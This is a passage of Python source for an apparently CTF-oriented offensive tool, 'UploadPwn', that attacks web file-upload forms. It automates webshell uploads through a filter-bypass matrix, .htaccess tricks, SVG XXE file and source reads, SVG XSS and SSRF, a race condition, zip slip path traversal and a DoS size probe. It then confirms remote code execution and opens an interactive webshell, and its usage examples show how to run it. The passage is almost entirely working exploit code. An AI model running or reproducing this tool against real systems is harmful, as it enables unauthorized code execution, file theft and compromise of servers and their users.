                                    "/bin","/usr","daemon","/var"]):
                                return True, url, param, r.text.strip()
                    except: pass
        return False, "", self.cmd_param, ""

    def launch_shell(self, filename, url, param, output,
                     shell_variant, content_type):
        """Announce RCE and drop into interactive shell."""
        pwn("RCE CONFIRMED!")
        print(f"""
{G}{BOLD}╔═══════════════════════════════════════════════╗
║  ✓  SHELL IS LIVE                             ║
╠═══════════════════════════════════════════════╣
║  File   : {filename[:43]:<43}║
║  URL    : {url[:43]:<43}║
║  Param  : {param:<43}║
║  Shell  : {shell_variant:<43}║
╚═══════════════════════════════════════════════╝{W}""")
        print(f"  First output: {output[:200]}\n")

        if self.d:
            self.d.record_rce(filename, url, output, shell_variant, content_type)

        if self.interactive:
            ws = WebShell(self.sm.session, url, param, self.d)
            ws.interactive(filename, shell_variant, content_type)
        else:
            info(f"To read flag:  curl '{url}?{param}=cat+{self.flag_path}'")
            info(f"To get shell:  run with --interactive flag")

    # ── Module 1: Main bypass matrix ──────────────────────────────────────────
    def attack_matrix(self):
        info("MODULE 1: Full Bypass Matrix")
        filenames = gen_all_filenames()
        info(f"{len(filenames)} filenames × {len({**SHELLS,**ASP_SHELLS,**JSP_SHELLS})} shells "
             f"× {len(CONTENT_TYPES_IMAGE+CONTENT_TYPES_MISC)} content-types")

        for fname in filenames:
            for (fn, content, ct, sname) in build_matrix(fname):
                status, body, _ = self.upload(fn, content, ct)
                if not self.is_success(status, body):
                    if self.verbose:
                        print(f"  {DIM}✗ {fn[:35]} [{sname}]{W}")
                    continue
                ok(f"UPLOADED: {fn} | {sname} | {ct}")
                rce_ok, url, param, out = self.verify_rce(fn)
                if rce_ok:
                    self.launch_shell(fn, url, param, out, sname, ct)
                    return fn, url
        fail("Matrix complete — no RCE.")
        return None, None

    # ── Module 2: .htaccess ───────────────────────────────────────────────────
    def attack_htaccess(self):
        info("MODULE 2: .htaccess")
        for i, payload in enumerate(HTACCESS_PAYLOADS):
            s, b, _ = self.upload(".htaccess", payload, "text/plain")
            if self.is_success(s, b):
                ok(f".htaccess variant {i+1} uploaded!")
                for sname, sbytes in SHELLS.items():
                    s2, b2, _ = self.upload("shell.jpg", sbytes, "image/jpeg")
                    if self.is_success(s2, b2):
                        rce_ok, url, param, out = self.verify_rce("shell.jpg")
                        if rce_ok:
                            self.launch_shell("shell.jpg",url,param,out,sname,"image/jpeg")
                            return "shell.jpg", url
        fail(".htaccess rejected.")
        return None, None

    # ── Module 3: SVG XXE file read ───────────────────────────────────────────
    def attack_svg_xxe_read(self, filepath):
        info(f"MODULE 3: SVG XXE File Read → {filepath}")
        s, b, _ = self.upload("xxe.svg", SVG_XXE_FILE(filepath), "image/svg+xml")
        if not self.is_success(s, b): return None
        for d in self.shell_dirs:
            url = f"{self.sm.target}{d}xxe.svg"
            try:
                r = self.sm.session.get(url, timeout=8)
                if r.status_code == 200 and len(r.text.strip()) > 5:
                    ok(f"XXE read success!")
                    content = r.text.strip()
                    print(f"\n{G}--- {filepath} ---{W}\n{content[:1000]}")
                    if self.d: self.d.record_xxe(filepath, content)
                    if "HTB{" in content and self.d:
                        self.d.record_flag(content)
                    return content
            except: pass
        return None

    # ── Module 4: SVG XXE PHP source read ────────────────────────────────────
    def attack_svg_xxe_source(self, php_file):
        info(f"MODULE 4: SVG XXE Source → {php_file}")
        s, b, _ = self.upload("xxe_src.svg", SVG_XXE_B64(php_file), "image/svg+xml")
        if not self.is_success(s, b): return None
        for d in self.shell_dirs:
            url = f"{self.sm.target}{d}xxe_src.svg"
            try:
                r = self.sm.session.get(url, timeout=8)
                if r.status_code == 200 and r.text.strip():
                    try:
                        decoded = base64.b64decode(
                            r.text.strip().encode()).decode(errors="replace")
                        ok(f"Source decoded: {php_file}")
                        print(f"\n{G}--- {php_file} ---{W}\n{decoded[:2000]}")
                        if self.d: self.d.record_source(php_file, decoded)
                        # Auto-detect upload dir
                        for m in re.finditer(r"['\"]([./]*\w+/\w*)['\"]", decoded):
                            c = m.group(1)
                            if any(x in c.lower() for x in
                                   ["upload","image","file","media","avatar"]):
                                p = "/"+c.lstrip("./")
                                if p not in self.shell_dirs:
                                    self.shell_dirs.append(p)
                                    ok(f"Upload dir added from source: {p}")
                                    if self.d:
                                        self.d.suggest(f"Upload dir from source: {p}")
                        return decoded
                    except: pass
            except: pass
        return None

    # ── Module 5: Race condition ──────────────────────────────────────────────
    def attack_race(self):
        info("MODULE 5: Race Condition")
        found  = [False]; result = [None]
        fn     = "shell.php"
        ct     = "image/gif"
        content= SHELLS["gif_magic"]

        def uploader():
            for _ in range(100):
                self.upload(fn, content, ct)
                if found[0]: break
                time.sleep(0.01)

        def accessor():
            for _ in range(300):
                rce_ok, url, param, out = self.verify_rce(fn)
                if rce_ok:
                    found[0] = True; result[0] = (url, param, out); break
                time.sleep(0.03)

        t1 = threading.Thread(target=uploader, daemon=True)
        t2 = threading.Thread(target=accessor, daemon=True)
        t1.start(); t2.start(); t1.join(); t2.join()

        if result[0]:
            url, param, out = result[0]
            self.launch_shell(fn, url, param, out, "gif_magic", ct)
            if self.d: self.d.filter_bypassed("Validate-then-Delete","race condition")
            return fn, url
        fail("Race condition failed.")
        return None, None

    # ── Module 6: Zip Slip ────────────────────────────────────────────────────
    def attack_zip_slip(self):
        info("MODULE 6: Zip Slip")
        try:
            import zipfile, io
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w") as zf:
                zf.writestr("../../../var/www/html/shell.php",
                            SHELLS["standard"].decode())
                zf.writestr("shell.php", SHELLS["standard"].decode())
            buf.seek(0)
            s, b, _ = self.upload("evil.zip", buf.read(), "application/zip")
            if self.is_success(s, b):
                rce_ok, url, param, out = self.verify_rce("shell.php")
                if rce_ok:
                    self.launch_shell("shell.php",url,param,out,"zip_slip","application/zip")
                    return "shell.php", url
        except Exception as e:
            fail(f"Zip slip: {e}")
        return None, None

    # ── Module 7: Auto-discover form + dirs ──────────────────────────────────
    def discover_all(self, page_url=None):
        info("MODULE 7: Discovery")
        if BS4_OK:
            url = page_url or self.sm.target
            try:
                r    = self.sm.session.get(url, timeout=10)
                soup = BeautifulSoup(r.text, "html.parser")
                for form in soup.find_all("form"):
                    for fi in form.find_all("input", {"type":"file"}):
                        fname = fi.get("name","?")
                        ok(f"Upload field: '{fname}' — use --field {fname}")
                        action = form.get("action")
                        if action:
                            ok(f"Upload action: {urljoin(url, action)}")
                        if self.d:
                            self.d.log("form_discover","found",
                                       f"Field: {fname}, action: {action}")
            except Exception as e:
                fail(f"Form discovery: {e}")

        for d in DEFAULT_SHELL_DIRS + ["/wp-content/uploads/",
                                        "/sites/default/files/"]:
            url = f"{self.sm.target}{d}"
            try:
                r = self.sm.session.get(url, timeout=5)
                if r.status_code in [200, 403]:
                    ok(f"Dir found (HTTP {r.status_code}): {url}")
                    if d not in self.shell_dirs:
                        self.shell_dirs.append(d)
                    if self.d: self.d.log("dir_discover","found",
                                          f"{url} HTTP {r.status_code}")
            except: pass

    # ── Module 8: DoS probes ──────────────────────────────────────────────────
    def attack_dos_probe(self):
        info("MODULE 8: DoS Probes")
        s, b, _ = self.upload("large.jpg", b"A"*50*1024*1024, "image/jpeg")
        if self.is_success(s, b):
            warn("50MB accepted — no size limit (DoS risk)")
            if self.d: self.d.log("DoS","found","No file size limit")
        else:
            ok("File size limit in place")


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    print(BANNER)

    ap = argparse.ArgumentParser(
        description="UploadPwn v4.0",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
═══ EXAMPLES ══════════════════════════════════════════════════════════

  # Basic — no login, auto-detect everything
  python3 uploadpwn.py -t http://IP:PORT

  # With login (auto-detects form fields + CSRF)
  python3 uploadpwn.py -t http://IP:PORT \\
    --login /login.php --user admin --pass admin

  # Login then navigate to upload page (sub-function)
  python3 uploadpwn.py -t http://IP:PORT \\
    --login /login.php --user admin --pass admin \\
    --nav /dashboard \\
    --upload-page /profile/settings \\
    --field avatar

  # Browser login (JS-heavy / complex flow)
  python3 uploadpwn.py -t http://IP:PORT \\
    --login /login.php --user admin --pass admin \\
    --login-method selenium

  # Inject custom cookie/header (already have session)
  python3 uploadpwn.py -t http://IP:PORT \\
    --cookie "PHPSESSID=abc123" \\
    --header "X-Auth-Token: mytoken"

  # SVG XXE — read flag directly (Section 8 HTB)
  python3 uploadpwn.py -t http://IP:PORT --svg-read /flag.txt

  # Read PHP source to find upload dir
  python3 uploadpwn.py -t http://IP:PORT --svg-src upload.php

  # Interactive webshell after RCE
  python3 uploadpwn.py -t http://IP:PORT --interactive

  # Run EVERYTHING
  python3 uploadpwn.py -t http://IP:PORT --all --interactive
═══════════════════════════════════════════════════════════════════════
        """
    )

    # ── Target ────────────────────────────────────────────────────────────────
    ap.add_argument("-t","--target",      required=True,
                    help="Target base URL  e.g. http://10.10.10.10:8080")
    ap.add_argument("-e","--endpoint",    default=None,
                    help="Upload endpoint  e.g. /upload.php  (auto-detected if omitted)")
    ap.add_argument("--shell-dirs",       nargs="+", default=DEFAULT_SHELL_DIRS,
                    help="Directories to search for uploaded shell")
    ap.add_argument("--field",            default=None,
                    help="Upload field name  (auto-detected if omitted)")
    ap.add_argument("--cmd-param",        default="cmd",
                    help="Shell command parameter name")
    ap.add_argument("--flag",             default="/flag.txt",
                    help="File to read after RCE")

    # ── Auth ──────────────────────────────────────────────────────────────────
    ap.add_argument("--login",            help="Login page path  e.g. /login.php")
    ap.add_argument("--user",             help="Username")
    ap.add_argument("--pass",             dest="password",  help="Password")
    ap.add_argument("--user-field",       default="username",
                    help="Username form field name")
    ap.add_argument("--pass-field",       default="password",
                    help="Password form field name")
    ap.add_argument("--login-method",     default="auto",
                    choices=["auto","requests","selenium"],
                    help="Login method")
    ap.add_argument("--nav",              dest="nav_url",
                    help="Page to navigate to after login  e.g. /dashboard")
    ap.add_argument("--upload-page",      dest="upload_page",
                    help="Page where upload form lives  e.g. /profile/settings")
    ap.add_argument("--cookie",           action="append", dest="cookies",
                    metavar="NAME=VALUE",
                    help="Inject cookie  (use multiple times)")
    ap.add_argument("--header",           action="append", dest="headers",
                    metavar="Name: Value",
                    help="Inject header  (use multiple times)")

    # ── Modules ───────────────────────────────────────────────────────────────
    ap.add_argument("--all",              action="store_true",
                    help="Run ALL modules")
    ap.add_argument("--matrix",           action="store_true",
                    help="Full bypass matrix (default)")
    ap.add_argument("--htaccess",         action="store_true")
    ap.add_argument("--svg-read",         metavar="PATH",
                    help="SVG XXE read file")
    ap.add_argument("--svg-src",          metavar="FILE",
                    help="SVG XXE read PHP source")
    ap.add_argument("--svg-xss",          action="store_true")
    ap.add_argument("--svg-ssrf",         metavar="URL")
    ap.add_argument("--race",             action="store_true")
    ap.add_argument("--zip",              action="store_true")
    ap.add_argument("--dos",              action="store_true")
    ap.add_argument("--discover",         action="store_true",
                    help="Discover upload form fields and directories")
    ap.add_argument("--no-probe",         action="store_true",
                    help="Skip filter fingerprinting")

    # ── Output ────────────────────────────────────────────────────────────────
    ap.add_argument("--interactive",      action="store_true",
                    help="Drop into interactive webshell on RCE")
    ap.add_argument("-v","--verbose",     action="store_true")
    ap.add_argument("-o","--output",      default="uploadpwn_report.json")

    args = ap.parse_args()

    target = args.target.rstrip("/")
    creds  = {"username": args.user, "password": args.password} \
             if args.user and args.password else None

    # ── Build session manager ──────────────────────────────────────────────────
    sm = SessionManager(
        target        = target,
        login_url     = (target + args.login) if args.login else None,
        creds         = creds,
        nav_url       = (target + args.nav_url) if args.nav_url else None,
        upload_page   = (target + args.upload_page) if args.upload_page else None,
        user_field    = args.user_field,
        pass_field    = args.pass_field,
        extra_headers = args.headers,
        extra_cookies = args.cookies,
    )

    d = Discovery(target, args.output)

    # ── Login ─────────────────────────────────────────────────────────────────
    if args.login and creds:
        sm.login(method=args.login_method)
        sm.navigate_to_upload_page()
    elif args.cookies or args.headers:
        info("Using provided cookie/header — skipping login")
    else:
        info("No login configured — unauthenticated")

    # ── Auto-detect upload endpoint and field ─────────────────────────────────
    upload_endpoint = args.endpoint
    upload_field    = args.field

    if not upload_endpoint:
        found_ep = sm.find_upload_endpoint()
        upload_endpoint = found_ep or "/upload.php"
        if found_ep:
            ok(f"Auto-detected endpoint: {upload_endpoint}")
        else:
            warn(f"Could not auto-detect endpoint — using default: {upload_endpoint}")

    if not upload_field:
        found_field = sm.find_upload_field()
        upload_field = found_field or "uploadFile"
        if found_field:
            ok(f"Auto-detected field: {upload_field}")
        else:
            warn(f"Could not auto-detect field — using default: {upload_field}")

    upload_url = target + upload_endpoint if not upload_endpoint.startswith("http") \
                 else upload_endpoint

    # ── Build attacker ────────────────────────────────────────────────────────
    atk = UploadAttacker(
        sm          = sm,
        upload_url  = upload_url,
        shell_dirs  = list(args.shell_dirs),
        cmd_param   = args.cmd_param,
        field       = upload_field,
        flag_path   = args.flag,
        verbose     = args.verbose,
        disc        = d,
        interactive = args.interactive,
    )

    print(f"\n{B}  Target        : {target}")
    print(f"  Upload URL    : {upload_url}")
    print(f"  Upload field  : {upload_field}")
    print(f"  Shell dirs    : {len(atk.shell_dirs)} paths")
    print(f"  Flag path     : {args.flag}")
    print(f"  Report        : {args.output}{W}\n")

    # ── Filter fingerprint ────────────────────────────────────────────────────
    if not args.no_probe:
        probe = FilterProbe(atk.upload, d, upload_field)
        probe.probe_all()

    run_all = args.all

    # ── Run modules ───────────────────────────────────────────────────────────
    if args.discover or run_all:
        atk.discover_all(sm.upload_page)

    if args.svg_read or run_all:
        atk.attack_svg_xxe_read(args.svg_read or args.flag)

    if args.svg_src or run_all:
        atk.attack_svg_xxe_source(args.svg_src or "upload.php")

    if args.svg_xss or run_all:
        s,b,_ = atk.upload("xss.svg", SVG_XSS, "image/svg+xml")
        if atk.is_success(s,b):
            ok("SVG XSS uploaded")
            if d: d.log("SVG XSS","found","XSS payload uploaded")

    if args.svg_ssrf or run_all:
        url = args.svg_ssrf or "http://127.0.0.1/"
        s,b,_ = atk.upload("ssrf.svg", SVG_SSRF(url), "image/svg+xml")
        if atk.is_success(s,b):
            ok(f"SVG SSRF uploaded → {url}")

    if args.htaccess or run_all:
        atk.attack_htaccess()

    if args.zip or run_all:
        atk.attack_zip_slip()

    if args.race or run_all:
        atk.attack_race()

    if args.dos or run_all:
        atk.attack_dos_probe()

    # Matrix always runs (unless something already found)
    if not d.rce:
        if args.matrix or run_all or not any([
            args.htaccess, args.svg_read, args.svg_src, args.svg_xss,
            args.svg_ssrf, args.race, args.zip, args.dos, args.discover
        ]):
            atk.attack_matrix()

    # ── Final report ──────────────────────────────────────────────────────────
    d.print_report()
    d.save()


if __name__ == "__main__":
    main()
